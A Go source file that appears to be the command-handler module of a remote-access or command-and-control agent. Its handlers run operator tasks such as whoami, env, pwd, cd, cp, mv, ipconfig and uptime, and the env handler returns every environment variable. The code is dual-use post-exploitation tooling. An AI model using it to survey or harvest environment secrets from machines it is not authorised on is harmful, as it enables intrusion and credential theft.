package main

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// processStart is the fallback clock for uptime off Windows without
// /proc/uptime.
var processStart = time.Now()

func handleWhoami(_ *Agent, _ Task) (Response, bool) {
	return Response{UserOutput: whoamiText(), Status: "success"}, false
}

func whoamiText() string {
	name := ""
	if u, err := user.Current(); err == nil {
		name = u.Username
	}
	domain := os.Getenv("USERDNSDOMAIN")
	if domain == "" {
		domain = os.Getenv("USERDOMAIN")
	}
	switch {
	case name != "" && domain != "" && !strings.Contains(name, "\\"):
		return domain + "\\" + name
	case name != "":
		return name
	case domain != "":
		return domain
	}
	return "unknown user"
}

func handleEnv(_ *Agent, _ Task) (Response, bool) {
	return Response{UserOutput: strings.Join(os.Environ(), "\n"), Status: "success"}, false
}

func handlePwd(_ *Agent, _ Task) (Response, bool) {
	dir, err := os.Getwd()
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: dir, Status: "success"}, false
}

func handleCd(_ *Agent, t Task) (Response, bool) {
	arg := strings.TrimSpace(taskArg(t.Parameters))
	if arg == "" {
		return errResponse(fmt.Errorf("usage: cd <path>"))
	}
	if err := os.Chdir(arg); err != nil {
		return errResponse(err)
	}
	dir, err := os.Getwd()
	if err != nil {
		dir = arg
	}
	return Response{UserOutput: "changed to " + dir, Status: "success"}, false
}

// twinPaths reads source/destination from a cp/mv parameters blob,
// accepting the named keys or a hand-built "a b" arguments string. The
// fallback only applies to blobs carrying arguments (or raw CLI text), so
// a half-filled JSON object cannot split into garbage paths.
func twinPaths(cmd, parameters string) (src, dst string, err error) {
	usage := fmt.Errorf("usage: %s <source> <destination>", cmd)
	src, dst = taskParam(parameters, "source"), taskParam(parameters, "destination")
	if src != "" && dst != "" {
		return src, dst, nil
	}
	var decoded map[string]any
	if err := json.Unmarshal([]byte(parameters), &decoded); err == nil {
		if arg, ok := decoded["arguments"].(string); ok {
			if fields := strings.Fields(arg); len(fields) == 2 {
				return fields[0], fields[1], nil
			}
		}
		return "", "", usage
	}
	if fields := strings.Fields(strings.TrimSpace(parameters)); len(fields) == 2 {
		return fields[0], fields[1], nil
	}
	return "", "", usage
}

func handleCp(_ *Agent, t Task) (Response, bool) {
	src, dst, err := twinPaths("cp", t.Parameters)
	if err != nil {
		return errResponse(err)
	}
	if err := copyFile(src, dst); err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: fmt.Sprintf("copied %s -> %s", src, dst), Status: "success"}, false
}

func handleMv(_ *Agent, t Task) (Response, bool) {
	src, dst, err := twinPaths("mv", t.Parameters)
	if err != nil {
		return errResponse(err)
	}
	if err := movePath(src, dst); err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: fmt.Sprintf("moved %s -> %s", src, dst), Status: "success"}, false
}

// copyFile duplicates one regular file, preserving permission bits.
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	st, err := in.Stat()
	if err != nil {
		return err
	}
	if st.IsDir() {
		return fmt.Errorf("not a file: %s", src)
	}
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	_, copyErr := io.Copy(out, in)
	closeErr := out.Close()
	if copyErr != nil {
		return copyErr
	}
	if closeErr != nil {
		return closeErr
	}
	return os.Chmod(dst, st.Mode().Perm())
}

// movePath renames, falling back to copy+delete across volumes where
// rename cannot reach. Genuine failures (missing source, denied) surface
// from the copy leg.
func movePath(src, dst string) error {
	if err := os.Rename(src, dst); err == nil {
		return nil
	}
	if err := copyFile(src, dst); err != nil {
		return err
	}
	return os.Remove(src)
}

func handleIpconfig(_ *Agent, _ Task) (Response, bool) {
	info := collectSysinfo()
	lines := []string{"host: " + info.host}
	lines = append(lines, info.ips...)
	return Response{UserOutput: strings.Join(lines, "\n"), Status: "success"}, false
}

func handleUptime(_ *Agent, _ Task) (Response, bool) {
	out, err := uptimeText()
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func uptimeText() (string, error) {
	if runtime.GOOS == "windows" {
		ticks, err := windowsTickCount()
		if err != nil {
			return "", err
		}
		return "uptime " + formatUptime(time.Duration(ticks)*time.Millisecond), nil
	}
	if d, err := procUptime(); err == nil {
		return "uptime " + formatUptime(d), nil
	}
	return "uptime " + formatUptime(time.Since(processStart)), nil
}

// windowsTickCount reads GetTickCount64. Implemented per platform in
// hostinfo_windows.go and hostinfo_other_test.go (test stub).

// procUptime reads the first field of /proc/uptime (seconds since boot).
func procUptime() (time.Duration, error) {
	raw, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return 0, err
	}
	fields := strings.Fields(string(raw))
	if len(fields) == 0 {
		return 0, fmt.Errorf("bad /proc/uptime")
	}
	secs, err := strconv.ParseFloat(fields[0], 64)
	if err != nil || secs < 0 {
		return 0, fmt.Errorf("bad /proc/uptime")
	}
	return time.Duration(secs * float64(time.Second)), nil
}

// formatUptime renders "1d2h3m4s", skipping leading zero units but always
// showing seconds.
func formatUptime(d time.Duration) string {
	if d < 0 {
		d = 0
	}
	secs := int64(d / time.Second)
	days, secs := secs/86400, secs%86400
	hours, secs := secs/3600, secs%3600
	mins, secs := secs/60, secs%60
	var b strings.Builder
	if days > 0 {
		fmt.Fprintf(&b, "%dd", days)
	}
	if hours > 0 || days > 0 {
		fmt.Fprintf(&b, "%dh", hours)
	}
	if mins > 0 || hours > 0 || days > 0 {
		fmt.Fprintf(&b, "%dm", mins)
	}
	fmt.Fprintf(&b, "%ds", secs)
	return b.String()
}
